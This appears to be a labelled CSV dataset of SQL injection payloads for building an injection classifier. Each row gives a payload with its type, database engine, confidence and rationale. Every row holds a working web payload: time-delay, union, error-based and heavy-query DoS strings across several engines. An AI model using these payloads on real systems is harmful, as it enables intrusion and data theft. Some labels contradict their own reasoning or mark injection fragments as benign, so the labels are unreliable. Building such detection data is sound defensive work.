id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22544,"( select ( case when ( 4232 = 4232 ) then ( select benchmark ( 5000000,md5 ( 0x6b637544 ) ) ) else 4232* ( select 4232 from mysql.db ) end ) )",time_blind,mysql,0.85,"Rule: Pattern match 'benchmark' function indicates time_blind (P5). Heuristic agrees on mysql DB signature with 5000000 benchmark constant",2
22545,"-7939"" ) or 3958 = 6909",boolean_blind,generic,0.70,"Rule and heuristic both match: OR equality pattern (3958 = 6909) typical of boolean-blind enumeration. No DB-specific signal",2
22546,"1%' ) ) ) union all select null,null,null--",union_based,generic,0.85,"Rule: UNION ALL SELECT structure detected (P7). Heuristic confirms UNION pattern allows column enumeration. Generic DB",2
22547,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'zwyx' = 'zwyx,boolean_blind,mysql,0.70,"Rule: RLIKE operator with sleep() detected (P3 vs P5). Pattern requires time_blind reclassification due to sleep priority > boolean",1
22548,-3136%' ) or 3400 = 6002,boolean_blind,generic,0.70,"Rule detects OR equality (3400 = 6002). Heuristic matches boolean condition. Generic SQL without DB markers",2
22549,"1"" ) as zjwu where 9963 = 9963 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.85,"Rule: benchmark() function (P5) overrides where clause. Heuristic: 5000000 constant = DoS pattern. MySQL time_blind confirmed",2
22550,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'krvo' like 'krvo,boolean_blind,mysql,0.70,"Rule matches RLIKE (boolean_blind P3) but sleep() present (time_blind P5). Conflict: sleep is stronger signal",1
22551,1'|| ( select 'tjzy' where 3037 = 3037,boolean_blind,oracle,0.70,"Oracle concatenation pattern with equality test. Generic SQL structure without strong attack signal beyond OR logic",1
22552,"1'+ ( select 'vkis' where 3712 = 3712 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) +'",heavy_query,mysql,0.70,"Rule: Boolean with generic keywords. Heuristic: 500000000 constant triggers heavy_query flag. Cartesian join pattern detected",2
22553,1' ) as fyib where 9246 = 9246,benign,generic,0.50,"Rule detects no attack signal. Heuristic confirms benign structure. Simple where equality without injection markers",2
22554,1 and 2620 = 2175,boolean_blind,generic,0.70,"Rule: AND equality pattern (2620 = 2175). Heuristic: boolean condition. Generic SQL structure",2
22555,1' ) ) ) waitfor delay '0:0:5' and ( ( ( 'clcf' = 'clcf,time_blind,mssql,0.85,"Rule: WAITFOR DELAY (P5, MSSQL-exclusive). Heuristic: time function detected. Both sources agree on time_blind + mssql",2
22556,1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.70,"Rule: sleep() function (P5). Heuristic: subquery time delay. MySQL time_blind confirmed",2
22557,"1"" ) where 7228 = 7228",benign,generic,0.50,"Rule: no SQLi signal. Heuristic: benign. Generic where equality, no injection pattern",2
22558,1'|| ( select 'qdkb' where 4331 = 4331,boolean_blind,oracle,0.70,"Oracle concatenation with equality. Generic SQL without strong attack signal",1
22559,1'|| ( select 'kyhs' from dual where 9491 = 9491,boolean_blind,oracle,0.70,"Oracle 'dual' table + concatenation. Generic SQL structure",1
22560,"1"" ) union all select null,null,null#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT pattern confirmed. Allows column enumeration",2
22561,1 ) ) as zykv where 2158 = 2158,benign,generic,0.50,"Rule: no attack signal. Heuristic: benign. Simple where clause",2
22562,"-2006' ) ) union all select 7852,7852,7852,7852,7852--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with numeric columns. Union-based data extraction confirmed",2
22563,"-2948' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'ivwt' = 'ivwt",benign,generic,0.50,"Rule: generic keywords. Heuristic: no SQLi signal. Looks like boolean but make_set context unclear",2
22564,"1 ) as zelk where 1944 = 1944 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.70,"Rule: boolean structure. Heuristic: 500000000 constant triggers heavy_query classification. Cartesian/DoS pattern",2
22565,"1%"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""%"" = """,boolean_blind,firebird,0.70,"Rule vs Heuristic conflict: Rule says boolean_blind (P3), structure confirms Firebird system table access. 2 sources agree",2
22566,1 ) ) as fqee where 3286 = 3286,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple where equality without injection",2
22567,"1"" ) where 7452 = 7452",benign,generic,0.50,"Rule: no attack signal. Heuristic: benign. Generic where clause",2
22568,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT. Eight numeric columns for data extraction",2
22569,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ltym' = 'ltym",time_blind,mysql,0.85,"Rule: benchmark() function (P5, MySQL). Heuristic: 5000000 constant flags DoS. Time_blind confirmed",2
22570,"1' ) ) union all select null,null,null,null,null,null#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT. Six null columns for database enumeration",2
22571,"1"" ) as ffon where 2738 = 2738 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",error_based,oracle,0.85,"Rule: xmltype() function (P4, Oracle-exclusive). Heuristic: boolean conflict. Error-based SQL via XML cast confirmed",2
22572,"select * from generate_series ( 9058,9058,case when ( 9058 = 1183 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.70,"Rule: generic keywords. Heuristic: generate_series pattern. PostgreSQL boolean-blind enumeration",2
22573,"1' ) as yjdg where 5262 = 5262 union all select null,null,null#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT pattern confirmed",2
22574,"-2860"" ) ) order by 1#",benign,generic,0.50,"Rule: no SQLi signal. Heuristic: benign. ORDER BY reconnaissance pattern without injection",2
22575,"elt ( 2427 = 2427,5518 )",benign,generic,0.50,"Rule: elt() boolean function (P3). Heuristic: no signal. Context unclear - lacks WHERE clause structure",1
22576,"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) -- ivku",heavy_query,mysql,0.85,"Rule: elt() indicates boolean (P3). Heuristic: floor(rand)*2 + GROUP BY = MySQL GROUP_CONCAT error-based pattern. Heavy query confirmed",2
22577,"1' ) where 6274 = 6274 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,"Rule: heavy_query via generate_series (P4). Heuristic: 5000000 constant = DoS DoS-style PostgreSQL injection",2
22578,"1'+ ( select 'asdq' where 4023 = 4023 and make_set ( 8403 = 8403,8899 ) ) +'",benign,generic,0.50,"Rule: generic keywords. Heuristic: benign. make_set context unclear without WHERE structure",2
22579,1' ) ) as fcjk where 7755 = 7755,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22580,-4896' ) union all select 1929--,union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT structure confirmed for data extraction",2
22581,"1"" ) ) and 4595 = 4595#",boolean_blind,generic,0.70,"Rule and Heuristic: AND equality pattern typical of boolean-blind",2
22582,"-9582' ) where 4397 = 4397 union all select 4397,4397,4397#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with three numeric columns",2
22583,"-9110"" ) ) union all select 2263,2263,2263,2263,2263#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with five columns",2
